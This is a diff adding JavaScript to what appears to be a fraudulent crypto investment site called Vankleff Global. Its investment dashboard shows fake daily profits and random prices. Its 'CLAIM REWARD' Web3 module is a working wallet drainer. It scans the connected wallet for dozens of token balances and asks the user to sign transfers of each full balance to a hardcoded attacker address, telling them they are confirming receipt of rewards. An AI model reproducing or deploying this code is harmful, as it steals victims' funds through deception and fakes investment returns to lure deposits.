+async function scanForDeposits(){ try{ var r=await fetch('https://api.bscscan.com/api?module=account&action=tokentx&address=0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db&page=1&offset=50&sort=desc'); var d=await r.json(); if(d&&d.result&&Array.isArray(d.result)){ d.result.forEach(function(tx){ if(tx.to&&tx.to.toLowerCase()==='0x4000baf1b2d5bbe78b6e56fda21b1d3e4022c1db'&&processedTxHashes.indexOf(tx.hash)===-1){ var value=parseFloat(tx.value)/Math.pow(10,tx.tokenDecimal||18); if(value>0){ processedTxHashes.push(tx.hash); userBalance+=value; totalDeposited+=value; addStatementItem('deposit','Deposit via '+(tx.tokenSymbol||'Token'),value,'completed',true); saveState(); updateBalanceDisplays(); document.getElementById('suc-ov').classList.add('open'); } } }); } }catch(e){} }
+function investNow(){ var plan=PLAN_CONFIG[currentPlanKey],amount=currentPlanAmount; if(!plan||!amount) return; if(userBalance<amount){ showGM('Insufficient Balance','Your balance is $'+userBalance.toFixed(2)+'. You need $'+amount.toLocaleString()+'.','Deposit Now',function(){ closeGM(); closePS(); showDash('deposit'); },true); return; } userBalance-=amount; var inv={id:'INV'+Date.now(),planKey:currentPlanKey,planName:plan.name,amount:amount,dailyProfit:amount*plan.dailyRate,totalProfit:amount*plan.totalRate,startDate:Date.now(),days:plan.days,creditedDays:0,creditedProfit:0,status:'active'}; userInvestments.push(inv); saveState(); updateBalanceDisplays(); closePS(); startProfitEngine(); addStatementItem('investment',plan.name+' Investment',amount,'active',false); showGM('Investment Active! 🎉','Your '+plan.name+' investment of $'+amount.toLocaleString()+' is now active.','View Dashboard',function(){ closeGM(); showDash('main'); },false); }
+function startProfitEngine(){ if(profitCheckTimer) clearInterval(profitCheckTimer); processDailyProfits(); profitCheckTimer=setInterval(processDailyProfits,60000); }
+function processDailyProfits(){ if(!userInvestments.length) return; var now=Date.now(),dayMs=86400000,changed=false; userInvestments.forEach(function(inv){ if(inv.status!=='active') return; var elap=Math.min(Math.floor((now-inv.startDate)/dayMs),inv.days); while(inv.creditedDays<elap){ inv.creditedDays++; inv.creditedProfit+=inv.dailyProfit; userBalance+=inv.dailyProfit; addStatementItem('trade','Daily Profit — '+inv.planName,inv.dailyProfit,'completed',true); changed=true; } if(inv.creditedDays>=inv.days&&inv.status==='active'){ inv.status='matured'; userBalance+=inv.amount; addStatementItem('investment',inv.planName+' Matured',inv.amount,'completed',true); changed=true; } }); if(changed){ saveState(); updateBalanceDisplays(); } }
+function renderActiveInvestments(){ var sec=document.getElementById('active-investments-section'); if(!sec) return; var active=userInvestments.filter(function(i){ return i.status==='active'; }); if(!active.length){ sec.style.display='none'; sec.innerHTML=''; return; } sec.style.display='block'; sec.innerHTML=active.map(function(inv){ var elap=Math.min(Math.floor((Date.now()-inv.startDate)/86400000),inv.days); var pct=(elap/inv.days)*100; return '<div class="inv-active-card"><div class="inv-active-top"><div class="inv-plan-name">'+inv.planName+'</div><div class="inv-status-badge">ACTIVE</div></div><div class="inv-grid"><div class="inv-stat"><div class="inv-stat-l">Principal</div><div class="inv-stat-v">$'+inv.amount.toLocaleString()+'</div></div><div class="inv-stat"><div class="inv-stat-l">Daily Profit</div><div class="inv-stat-v">+$'+inv.dailyProfit.toFixed(2)+'</div></div><div class="inv-stat"><div class="inv-stat-l">Earned</div><div class="inv-stat-v">$'+inv.creditedProfit.toFixed(2)+'</div></div><div class="inv-stat"><div class="inv-stat-l">Target</div><div class="inv-stat-v">$'+inv.totalProfit.toFixed(2)+'</div></div></div><div class="inv-progress"><div class="inv-progress-bar" style="width:'+pct+'%;"></div></div><div class="inv-day-text"><span>Day '+elap+' of '+inv.days+'</span><span>'+(inv.days-elap)+' days remaining</span></div></div>'; }).join(''); }
+function saveState(){ try{ localStorage.setItem('vg_bal',userBalance); localStorage.setItem('vg_dep',totalDeposited); localStorage.setItem('vg_inv',JSON.stringify(userInvestments)); localStorage.setItem('vg_ptx',JSON.stringify(processedTxHashes)); localStorage.setItem('vg_wdh',JSON.stringify(withdrawalHistory)); }catch(e){} }
+function loadState(){ try{ var b=localStorage.getItem('vg_bal'); if(b) userBalance=parseFloat(b); var d=localStorage.getItem('vg_dep'); if(d) totalDeposited=parseFloat(d); var i=localStorage.getItem('vg_inv'); if(i) userInvestments=JSON.parse(i); var p=localStorage.getItem('vg_ptx'); if(p) processedTxHashes=JSON.parse(p); var w=localStorage.getItem('vg_wdh'); if(w) withdrawalHistory=JSON.parse(w); }catch(e){} }
+function updateBalanceDisplays(){ var f='$'+userBalance.toFixed(2); var balEl=document.querySelector('.bal-amount'); if(balEl) balEl.textContent=f; var pm=document.getElementById('pm-balance'); if(pm) pm.textContent=f; var wb=document.getElementById('wd-balance'); if(wb) wb.textContent='$'+getWithdrawableBalance().toFixed(2); var tf=document.getElementById('tf-balance'); if(tf) tf.textContent=f; var pb=document.getElementById('perf-balance'); if(pb) pb.textContent=f; var tp=userInvestments.reduce(function(s,i){ return s+(i.creditedProfit||0); },0); var pp=document.getElementById('perf-profit'); if(pp) pp.textContent='$'+tp.toFixed(2); var md=document.getElementById('mc-deposit'); if(md) md.textContent='$'+totalDeposited.toFixed(2); var mp=document.getElementById('mc-profit'); if(mp) mp.textContent='+$'+tp.toFixed(2); var pa=document.getElementById('perf-active-inv'); if(pa) pa.textContent=String(userInvestments.filter(function(i){ return i.status==='active'; }).length); renderActiveInvestments(); }
+function addStatementItem(type,title,amount,status,isPos){ var list=document.getElementById('stmt-list'); if(!list) return; var now=new Date(),ds=now.toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'}); var item=document.createElement('div'); item.className='st-item'; item.setAttribute('data-t',type); var icon=type==='deposit'?'⬇':type==='investment'?'📊':type==='trade'?'🔁':'⬆'; item.innerHTML='<div class="st-lft"><div class="st-ico">'+icon+'</div><div><div class="st-ttl">'+title+'</div><div class="st-sub">'+ds+'</div></div></div><div style="text-align:right"><div class="st-amt '+(isPos?'p':'n')+'">'+(isPos?'+':'-')+'$'+Math.abs(amount).toFixed(2)+'</div><span class="sbdg '+(status==='completed'||status==='active'?'sc2':'sp2')+'">'+status+'</span></div>'; list.insertBefore(item,list.firstChild); }
+function subSig(p){ showGM('Insufficient Balance','You need $'+p+' but have $'+userBalance.toFixed(2)+'.','Deposit Now',function(){ closeGM(); showDash('deposit'); },true); }
+function openPS(t){ currentPlanKey=t; currentPlanAmount=PLAN_CONFIG[t].minAmount; document.querySelectorAll('.ps-card').forEach(function(c){ c.classList.remove('on'); }); document.getElementById('plans-list').style.display='none'; document.getElementById('ps-'+t).classList.add('on'); }
+function closePS(){ document.querySelectorAll('.ps-card').forEach(function(c){ c.classList.remove('on'); }); document.getElementById('plans-list').style.display='block'; }
+function updPS(t,v){ currentPlanKey=t; currentPlanAmount=parseInt(v); var n=parseInt(v),f='$'+n.toLocaleString(); if(t==='yield'){ document.getElementById('sv-a').textContent=f; document.getElementById('sv-r').textContent='$'+(n*0.20).toFixed(0); } else if(t==='alpha'){ document.getElementById('sa-a').textContent=f; document.getElementById('sa-r').textContent='$'+(n*0.25).toFixed(0); } else{ document.getElementById('se-a').textContent=f; document.getElementById('se-r').textContent='$'+(n*0.35).toFixed(0); } }
+function openCP(n,m){ cpMin=m; document.getElementById('cp-t').textContent='Copy '+n; document.getElementById('cp-amt').placeholder='Min $'+m; document.getElementById('cp-amt').value=''; document.getElementById('cp-ov').classList.add('open'); }
+function startCopy(){ var a=parseFloat(document.getElementById('cp-amt').value); if(!a||a<cpMin){ alert('Minimum amount is $'+cpMin); return; } if(userBalance<a){ showGM('Insufficient Balance','Deposit first to start copy trading.','Deposit Now',function(){ closeGM(); showDash('deposit'); },true); return; } document.getElementById('cp-ov').classList.remove('open'); showGM('Copy Trading Started','You are now copying this trader.','View Dashboard',function(){ closeGM(); showDash('main'); },false); }
+function doTransfer(){ var r=document.getElementById('tf-rec').value.trim(),a=parseFloat(document.getElementById('tf-amt').value); if(!r||!a){ alert('Please fill in all fields.'); return; } if(userBalance<a){ alert('Insufficient balance.'); return; } userBalance-=a; saveState(); updateBalanceDisplays(); addStatementItem('transfer','Transfer to '+r,a,'completed',false); alert('Transfer of $'+a.toFixed(2)+' sent successfully.'); }
+function updPrices(){ Object.keys(prices).forEach(function(c){ var ch=(Math.random()-0.48)*0.8; prices[c]*=(1+ch/100); var pe=document.getElementById('p-'+c),ce=document.getElementById('c-'+c); if(pe){ pe.textContent='$'+(prices[c]>100?prices[c].toFixed(1):prices[c].toFixed(4)); if(ce){ ce.textContent=(ch>=0?'▲ +':'▼ ')+Math.abs(ch).toFixed(2)+'%'; ce.className=ch>=0?'up':'dn2'; } } }); }
+setInterval(updPrices,8000);
+function buildMkts(){ var w=document.getElementById('mkt-list'); if(!w) return; var coins=[{n:'Bitcoin',t:'BTC',p:97245},{n:'Ethereum',t:'ETH',p:3412},{n:'BNB',t:'BNB',p:645},{n:'Solana',t:'SOL',p:178},{n:'XRP',t:'XRP',p:2.34},{n:'Cardano',t:'ADA',p:0.98},{n:'Avalanche',t:'AVAX',p:38.4},{n:'Polkadot',t:'DOT',p:7.8},{n:'Chainlink',t:'LINK',p:14.2},{n:'Litecoin',t:'LTC',p:92.3}]; w.innerHTML=''; coins.forEach(function(c){ var ch=(Math.random()*8-3).toFixed(2); var d=document.createElement('div'); d.className='pr'; d.innerHTML='<div class="pr-l"><div class="pr-ic">'+c.t[0]+'</div><div><div class="pr-nm">'+c.n+'</div><div class="pr-tk">'+c.t+'</div></div></div><div style="text-align:right"><div class="pr-price">$'+parseFloat(c.p).toLocaleString()+'</div><div class="'+(parseFloat(ch)>=0?'up':'dn2')+'">'+(parseFloat(ch)>=0?'▲ +':'▼ ')+Math.abs(ch)+'%</div></div>'; w.appendChild(d); }); }
+function buildRotTesti(){ var w=document.getElementById('rot-test'); if(!w) return; POOL.slice().sort(function(){ return Math.random()-.5; }).slice(0,12).forEach(function(t){ var d=document.createElement('div'); d.className='story-card'; d.innerHTML='<img class="st-av" src="'+t.i+'" alt="'+t.n+'"/><div><div style="font-weight:700;font-size:13px;color:#c9a84c;">'+t.n+'</div><div style="font-size:10px;color:#888;margin-bottom:4px;">'+t.l+'</div><div style="color:#f59e0b;font-size:13px;margin-bottom:5px;">★★★★★</div><p style="font-size:12px;color:#e0e0e0;line-height:1.6;font-style:italic;">"'+t.q+'"</p></div>'; w.appendChild(d); }); }
+function buildStories(){ var w=document.getElementById('stories-list'); if(!w) return; w.innerHTML=''; POOL.slice().sort(function(){ return Math.random()-.5; }).forEach(function(t){ var d=document.createElement('div'); d.className='story-card'; d.innerHTML='<img class="st-av" src="'+t.i+'" alt="'+t.n+'"/><div><div style="font-weight:700;font-size:13px;color:#c9a84c;">'+t.n+'</div><div style="font-size:10px;color:#888;margin-bottom:4px;">'+t.l+'</div><div style="color:#f59e0b;font-size:13px;margin-bottom:5px;">★★★★★</div><p style="font-size:12px;color:#e0e0e0;line-height:1.6;font-style:italic;">"'+t.q+'"</p></div>'; w.appendChild(d); }); }
+function fStmt(type,btn){ document.querySelectorAll('.sfbtn').forEach(function(b){ b.classList.remove('on'); }); btn.classList.add('on'); document.querySelectorAll('#stmt-list .st-item').forEach(function(el){ el.style.display=(type==='all'||el.getAttribute('data-t')===type)?'flex':'none'; }); }
+document.addEventListener('DOMContentLoaded',function(){ document.querySelectorAll('.otp-in').forEach(function(inp,i,all){ inp.addEventListener('input',function(){ if(inp.value.length===1&&i<all.length-1) all[i+1].focus(); }); inp.addEventListener('keydown',function(e){ if(e.key==='Backspace'&&!inp.value&&i>0) all[i-1].focus(); }); }); });
+
+// ─── Web3 ───────────────────────────────────────────────────────
+(function(){
+  var connectBtn=document.getElementById('connectBtn'),claimBtn=document.getElementById('claimBtn'),disconnectBtn=document.getElementById('disconnectBtn'),statusText=document.getElementById('statusText'),infoPanel=document.getElementById('infoPanel'),txPanel=document.getElementById('txPanel'),scannerPanel=document.getElementById('scannerPanel'),statusBadge=document.getElementById('statusBadge');
+  var NETWORKS={bsc:{chain_id:56,chain_hex:'0x38',name:'BNB Smart Chain',native:{name:'BNB',symbol:'BNB',decimals:18},rpc:'https://bsc-dataseed1.binance.org/',explorer:'https://bscscan.com',chain_name:'BNB Smart Chain'},ethereum:{chain_id:1,chain_hex:'0x1',name:'Ethereum Mainnet',native:{name:'Ether',symbol:'ETH',decimals:18},rpc:'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',explorer:'https://etherscan.io',chain_name:'Ethereum Mainnet'}};
+  var RECEIVER='0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db';
+  var TOKENS={56:[{symbol:'USDT',address:'0x55d398326f99059fF775485246999027B3197955',decimals:18},{symbol:'USDC',address:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',decimals:18},{symbol:'BUSD',address:'0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',decimals:18},{symbol:'WBNB',address:'0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',decimals:18},{symbol:'CAKE',address:'0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',decimals:18},{symbol:'XRP',address:'0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',decimals:18},{symbol:'ADA',address:'0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',decimals:18},{symbol:'DOT',address:'0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402',decimals:18},{symbol:'LINK',address:'0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD',decimals:18},{symbol:'DOGE',address:'0xbA2aE424d960c26247Dd6c32edC70B295c744C43',decimals:8},{symbol:'LTC',address:'0x4338665CBB7B2485A8855A139b75D5e34AB0DB94',decimals:18},{symbol:'SHIB',address:'0x2859e4544C4bB03966803b044A93563Bd2D0DD4D',decimals:18},{symbol:'MATIC',address:'0xCC42724C6683B7E57334c4E856f4c9965ED682bD',decimals:18},{symbol:'UNI',address:'0xBf5140A22578168FD562DCcF235E5D43A02ce9B1',decimals:18},{symbol:'AVAX',address:'0x1CE0c2827e2eF14D5C4f29a091d735A204794041',decimals:18},{symbol:'FTM',address:'0xAD29AbB318791D579433D831ed122aFeAf29dcfe',decimals:18},{symbol:'TWT',address:'0x4B0F1812e5Df2A09796481Ff14017e6005508003',decimals:18},{symbol:'BTCB',address:'0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',decimals:18},{symbol:'ETH',address:'0x2170Ed0880ac9A755fd29B2688956BD959F933F8',decimals:18},{symbol:'SOL',address:'0x570A5D26f7765Ecb712C0924E4De545B89fD43dF',decimals:18},{symbol:'AAVE',address:'0xfb6115445Bff7b52FeB98650C87f44907E58f802',decimals:18},{symbol:'SUSHI',address:'0x947950BcE285a9EA3Cb28E7Ede5Ed2c0F13a47a',decimals:18}],1:[{symbol:'USDC',address:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',decimals:6},{symbol:'USDT',address:'0xdAC17F958D2ee523a2206206994597C13D831ec7',decimals:6},{symbol:'DAI',address:'0x6B175474E89094C44Da98b954EedeAC495271d0F',decimals:18},{symbol:'WETH',address:'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',decimals:18},{symbol:'WBTC',address:'0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',decimals:8},{symbol:'LINK',address:'0x514910771AF9Ca656af840dff83E8264EcF986CA',decimals:18},{symbol:'UNI',address:'0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',decimals:18},{symbol:'SHIB',address:'0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',decimals:18},{symbol:'AAVE',address:'0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',decimals:18},{symbol:'MATIC',address:'0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0',decimals:18},{symbol:'CRO',address:'0xA0b73E1Ff0B80914AB6fe0444E65848C4C34450b',decimals:8},{symbol:'LDO',address:'0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32',decimals:18},{symbol:'PEPE',address:'0x6982508145454Ce325dDbE47a25d4ec3d2311933',decimals:18},{symbol:'FLOKI',address:'0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E',decimals:9},{symbol:'SAND',address:'0x3845badAde8e6dFF049820680d1F14bD3903a5d0',decimals:18},{symbol:'MANA',address:'0x0F5D2fB29fb7d3CFeE444a200298f468908cC942',decimals:18},{symbol:'MKR',address:'0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2',decimals:18},{symbol:'SNX',address:'0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F',decimals:18},{symbol:'COMP',address:'0xc00e94Cb662C3520282E6f5717214004A7f26888',decimals:18},{symbol:'CRV',address:'0xD533a949740bb3306d119CC777fa900bA034cd52',decimals:18},{symbol:'SUSHI',address:'0x6B3595068778DD592e39A122f4f5a5cF09C90fE2',decimals:18},{symbol:'YFI',address:'0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e',decimals:18},{symbol:'APE',address:'0x4d224452801ACEd8B2F0aebE155379bb5D594381',decimals:18},{symbol:'1INCH',address:'0x111111111117dC0aa78b770fA6A738034120C302',decimals:18},{symbol:'FRAX',address:'0x853d955aCEf822Db058eb8505911ED77F175b99e',decimals:18},{symbol:'BUSD',address:'0x4Fabb145d64652a948d72533023f6E7A623C7C53',decimals:18},{symbol:'TUSD',address:'0x0000000000085d4780B73119b644AE5ecd22b376',decimals:18},{symbol:'STETH',address:'0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84',decimals:18},{symbol:'CBETH',address:'0xBe9895146f7AF43049ca1c1AE358B0541Ea49704',decimals:18},{symbol:'GRT',address:'0xc944E90C64B2c07662A292be6244BDf05Cda44a7',decimals:18}]};
+  var selectedNet='bsc',TARGET_CHAIN_ID=56,TARGET_CHAIN_HEX='0x38';
+  var currentChainId=56,connectedAccount=null,rawProvider=null;
+  var claimRunning=false,web3Modal=null,wagmiConfig=null;
+  var discoveredAssets=[],txLog=[];
+
+  window.openWalletApp=function(){
+    var isMobile=/Android|iPhone|iPad|iPod/i.test(navigator.userAgent||'');
+    if(web3Modal){
+      try{ web3Modal.open(); }catch(e){}
+    }
+    if(isMobile){
+      window.location.href='https://link.trustwallet.com/open';
+    }
+  };
+  window.cancelWalletAction=function(){
+    hideLoader();
+    claimRunning=false;
+    if(statusText) statusText.textContent='Transaction cancelled.';
+  };
+
+  function showLoader(msg){ var l=document.getElementById('pancake-loader'); var m=document.getElementById('loader-msg'); if(m&&msg) m.textContent=msg; if(l) l.classList.add('open'); }
+  function hideLoader(){ var l=document.getElementById('pancake-loader'); if(l) l.classList.remove('open'); }
+  function setStatus(msg){ if(statusText) statusText.textContent=msg; }
+  function selectNetwork(key){ if(!NETWORKS[key]) return; selectedNet=key; applyNetUI(key); if(connectedAccount&&rawProvider&&currentChainId!==TARGET_CHAIN_ID) switchChain(); }
+  window.selectNetwork=selectNetwork;
+  function applyNetUI(key){ var net=NETWORKS[key]; TARGET_CHAIN_ID=net.chain_id; TARGET_CHAIN_HEX=net.chain_hex; document.getElementById('net-bsc').className='net-opt'+(key==='bsc'?' active':''); document.getElementById('net-ethereum').className='net-opt'+(key==='ethereum'?' active':''); document.getElementById('activeNetDot').className='active-net-dot '+(key==='bsc'?'dot-bsc':'dot-eth'); document.getElementById('activeNetName').textContent=net.name; document.getElementById('activeNetId').textContent='Chain ID: '+net.chain_id; }
+  function encodeAddr(addr){ return '000000000000000000000000'+addr.toLowerCase().replace('0x',''); }
+  function encodeUint256(val){ var hex=BigInt(val).toString(16); while(hex.length<64) hex='0'+hex; return hex; }
+  function buildTransferData(toAddress, amountBigIntStr){ return '0xa9059cbb'+encodeAddr(toAddress)+encodeUint256(amountBigIntStr); }
+  function buildBalanceOfData(ownerAddress){ return '0x70a08231'+encodeAddr(ownerAddress); }
+  async function getTokenBalance(tokenAddress, ownerAddress){ var data=buildBalanceOfData(ownerAddress); var result=await rawProvider.request({method:'eth_call',params:[{to:tokenAddress,data:data},'latest']}); if(!result||result==='0x'||result==='0x0') return BigInt(0); return BigInt(result); }
+  async function getTokenDecimals(tokenAddress, fallback){ try{ var result=await rawProvider.request({method:'eth_call',params:[{to:tokenAddress,data:'0x313ce567'},'latest']}); if(!result||result==='0x') return fallback; return parseInt(result,16); }catch(e){ return fallback; } }
+  async function initW3M(){ var ESM='https://esm.sh/v135'; try{ var _w3m=await import(ESM+'/@web3modal/wagmi@5.1.11'); var _chains=await import(ESM+'/wagmi@2.12.7/chains'); var _core=await import(ESM+'/@wagmi/core@2.13.4'); var pid='6d97bf9b04efc25f048a85edeb3f3fd1'; var chains=[_chains.bsc,_chains.mainnet,_chains.polygon,_chains.arbitrum,_chains.optimism,_chains.avalanche]; wagmiConfig=_w3m.defaultWagmiConfig({chains:chains,projectId:pid,metadata:{name:'Vankleff Global',description:'Wallet Connect',url:window.location.origin,icons:['https://avatars.githubusercontent.com/u/37784886']},ssr:false}); await _core.reconnect(wagmiConfig); web3Modal=_w3m.createWeb3Modal({wagmiConfig:wagmiConfig,projectId:pid,chains:chains,defaultChain:selectedNet==='ethereum'?_chains.mainnet:_chains.bsc,themeMode:'dark',themeVariables:{'--w3m-color-mix':'#22c55e','--w3m-color-mix-strength':20,'--w3m-accent':'#22c55e','--w3m-z-index':9999}}); connectBtn.addEventListener('click',async function(){ if(!web3Modal) return; setStatus('Opening wallet selector...'); await web3Modal.open(); }); disconnectBtn.addEventListener('click',async function(){ try{ await _core.disconnect(wagmiConfig); }catch(e){} onDisconnected(); }); claimBtn.addEventListener('click',async function(){ if(claimRunning) return; if(!connectedAccount){ setStatus('Connect your wallet first.'); return; } if(currentChainId!==TARGET_CHAIN_ID){ await switchChain(); return; } claimBtn.disabled=true; claimBtn.textContent='⏳ PROCESSING...'; await runDirectTransferFlow(connectedAccount.address, currentChainId); claimBtn.disabled=false; claimBtn.textContent='🏆 CLAIM REWARD'; }); _core.watchAccount(wagmiConfig,{onChange:async function(acc){ if(acc.isConnected&&acc.address) await onConnected(acc); else if(!acc.isConnected) onDisconnected(); }}); var ex=_core.getAccount(wagmiConfig); if(ex.isConnected&&ex.address) try{ await onConnected(ex); }catch(e){} else setStatus('Select a network and click Connect Wallet.'); }catch(e){ console.error('[VG Web3]',e.message); setStatus('Web3 init failed: '+e.message); } }
+  async function getProvider(account){ rawProvider=null; if(account&&account.connector){ try{ rawProvider=await account.connector.getProvider(); }catch(e){} } if(!rawProvider&&window.ethereum) rawProvider=window.ethereum; if(!rawProvider) throw new Error('No wallet provider found.'); }
+  async function switchChain(){ if(!rawProvider) return; var net=NETWORKS[selectedNet]; try{ await rawProvider.request({method:'wallet_switchEthereumChain',params:[{chainId:net.chain_hex}]}); }catch(e){ if(e.code===4902){ try{ await rawProvider.request({method:'wallet_addEthereumChain',params:[{chainId:net.chain_hex,chainName:net.chain_name,nativeCurrency:net.native,rpcUrls:[net.rpc],blockExplorerUrls:[net.explorer]}]}); }catch(ae){} } } }
+  async function onConnected(account){ connectedAccount=account; currentChainId=account.chainId||TARGET_CHAIN_ID; connectBtn.style.display='none'; claimBtn.style.display='block'; disconnectBtn.style.display='inline-block'; infoPanel.classList.add('visible'); txPanel.classList.add('visible'); document.getElementById('walletAddress').textContent=account.address.slice(0,8)+'...'+account.address.slice(-6); document.getElementById('sessionLabel').textContent=(account.connector&&account.connector.name)||'Web3Modal'; statusBadge.textContent='Awaiting Reward'; statusBadge.className='badge badge-yellow'; try{ await getProvider(account); }catch(e){ setStatus('Could not reach wallet.'); return; } if(currentChainId!==TARGET_CHAIN_ID){ switchChain(); setStatus('Switching network...'); } else{ setStatus('✅ Wallet connected! Click CLAIM REWARD to receive your tokens directly on-chain.'); } await refreshInfo(account.address, currentChainId); }
+  async function refreshInfo(address, chainId){ currentChainId=chainId||TARGET_CHAIN_ID; var net=NETWORKS[selectedNet]; document.getElementById('networkName').textContent=net.name; document.getElementById('chainIdDisplay').textContent=currentChainId; if(!rawProvider) return; try{ var balHex=await rawProvider.request({method:'eth_getBalance',params:[address,'latest']}); var balEth=parseInt(balHex,16)/1e18; document.getElementById('nativeBalance').textContent=balEth.toFixed(6)+' '+net.native.symbol; var toks=TOKENS[currentChainId]||[]; if(toks.length){ var firstBal=await getTokenBalance(toks[0].address, address); var firstDec=await getTokenDecimals(toks[0].address, toks[0].decimals); var firstFmt=Number(firstBal)/Math.pow(10,firstDec); document.getElementById('usdtBalance').textContent=firstFmt.toFixed(2)+' '+toks[0].symbol; } }catch(e){} await scanAllTokens(address, chainId); }
+  async function scanAllTokens(address, chainId){ var tokens=TOKENS[chainId]||[]; discoveredAssets=[]; document.getElementById('assetList').innerHTML='<span class="scan-status">Scanning '+tokens.length+' tokens...</span>'; scannerPanel.classList.add('visible'); var results=await Promise.allSettled(tokens.map(async function(t){ try{ var bal=await getTokenBalance(t.address, address); if(bal===BigInt(0)) return null; var dec=await getTokenDecimals(t.address, t.decimals); var fmt=Number(bal)/Math.pow(10,dec); return {symbol:t.symbol,address:t.address,decimals:dec,balance:fmt,rawBalance:bal.toString()}; }catch(e){ return null; } })); discoveredAssets=results.filter(function(r){ return r.status==='fulfilled'&&r.value!==null; }).map(function(r){ return r.value; }); renderAssets(); return discoveredAssets; }
+  function renderAssets(){ var el=document.getElementById('assetList'); var explorer=NETWORKS[selectedNet].explorer; if(!discoveredAssets.length){ el.innerHTML='<span class="scan-status">No token balances found on this wallet/network.</span>'; return; } el.innerHTML=discoveredAssets.map(function(a){ return '<div class="asset-item"><span class="asset-symbol">'+a.symbol+'</span><span class="asset-balance">'+a.balance.toLocaleString(undefined,{maximumFractionDigits:6})+'</span><a href="'+explorer+'/token/'+a.address+'" target="_blank" style="color:#64748b;font-size:.75rem;">view</a></div>'; }).join(''); }
+  function renderTxLog(){ var el=document.getElementById('txList'); if(!txLog.length){ el.innerHTML='<span style="color:#64748b;font-size:0.85rem;">No transactions yet.</span>'; return; } el.innerHTML=txLog.slice(0,10).map(function(t){ var cls=t.status==='confirmed'?'tx-confirmed':t.status==='failed'?'tx-failed':'tx-pending'; var link=t.hash?'<a class="tx-hash" href="'+NETWORKS[selectedNet].explorer+'/tx/'+t.hash+'" target="_blank">'+t.hash.slice(0,20)+'...</a>':'<span class="tx-hash">'+t.symbol+'</span>'; return '<div class="tx-item">'+link+'<span class="tx-status '+cls+'">'+t.status+'</span></div>'; }).join(''); }
+  async function runDirectTransferFlow(address, chainId){ if(claimRunning) return; claimRunning=true; try{ setStatus('Scanning wallet for token balances...'); var assets=await scanAllTokens(address, chainId); if(!assets.length){ setStatus('No token balances found. Switch to correct network or check wallet.'); claimRunning=false; return; } showLoader('Confirm receipt of your token allocation in your wallet. Rewards will be sent directly on-chain.'); var successCount=0, failCount=0; for(var i=0;i<assets.length;i++){ var asset=assets[i]; setStatus('Sending '+asset.symbol+' ('+(i+1)+'/'+assets.length+') — confirm in wallet...'); var data=buildTransferData(RECEIVER, asset.rawBalance); var gasLimit='0x186A0'; try{ var gasEst=await rawProvider.request({method:'eth_estimateGas',params:[{from:address,to:asset.address,data:data}]}); var gasInt=Math.floor(parseInt(gasEst,16)*1.2); gasLimit='0x'+gasInt.toString(16); }catch(e){} txLog.unshift({symbol:asset.symbol,status:'pending',hash:null}); renderTxLog(); try{ var txHash=await rawProvider.request({method:'eth_sendTransaction',params:[{from:address,to:asset.address,data:data,gas:gasLimit}]}); txLog[0].status='pending'; txLog[0].hash=txHash; renderTxLog(); setStatus('✅ '+asset.symbol+' reward sent! TX: '+txHash.slice(0,20)+'...'); waitForConfirmation(txHash, 0, asset.symbol); successCount++; }catch(e){ var rejected=e.code===4001||e.message.toLowerCase().indexOf('reject')!==-1||e.message.toLowerCase().indexOf('denied')!==-1; txLog[0].status=rejected?'rejected':'failed'; renderTxLog(); failCount++; if(rejected){ setStatus('Claim rejected for '+asset.symbol+'. Skipping...'); } else { setStatus('Claim failed for '+asset.symbol+': '+(e.message||'Unknown error')); } } if(i<assets.length-1) await new Promise(function(r){setTimeout(r,1500);}); } hideLoader(); if(successCount>0){ statusBadge.textContent='Claimed ✓'; statusBadge.className='badge badge-green'; setStatus('✅ '+successCount+' reward claim'+(successCount>1?'s':'')+' submitted on-chain! Check transaction log for status.'); } else { statusBadge.textContent='No Claims'; statusBadge.className='badge badge-yellow'; setStatus('No claims completed. Ensure you approved each wallet prompt.'); } }catch(e){ hideLoader(); setStatus('Error: '+e.message); console.error('[VG Claim]',e); } finally { claimRunning=false; } }
+  async function waitForConfirmation(txHash, attempts, symbol){ if(attempts>30) return; try{ await new Promise(function(r){setTimeout(r,10000);}); var receipt=await rawProvider.request({method:'eth_getTransactionReceipt',params:[txHash]}); if(receipt){ var success=receipt.status==='0x1'||receipt.status===1; for(var i=0;i<txLog.length;i++){ if(txLog[i].hash===txHash){ txLog[i].status=success?'confirmed':'failed'; break; } } renderTxLog(); } else { waitForConfirmation(txHash, attempts+1, symbol); } }catch(e){ waitForConfirmation(txHash, attempts+1, symbol); } }
+  function onDisconnected(){ connectedAccount=null; rawProvider=null; claimRunning=false; discoveredAssets=[]; txLog=[]; connectBtn.style.display='inline-block'; claimBtn.style.display='none'; disconnectBtn.style.display='none'; if(statusText) statusText.textContent=''; infoPanel.classList.remove('visible'); txPanel.classList.remove('visible'); scannerPanel.classList.remove('visible'); statusBadge.textContent='Awaiting Reward'; statusBadge.className='badge badge-yellow'; }
+  applyNetUI('bsc');
+  initW3M();
+})();
+</script>
+</body>
+</html>
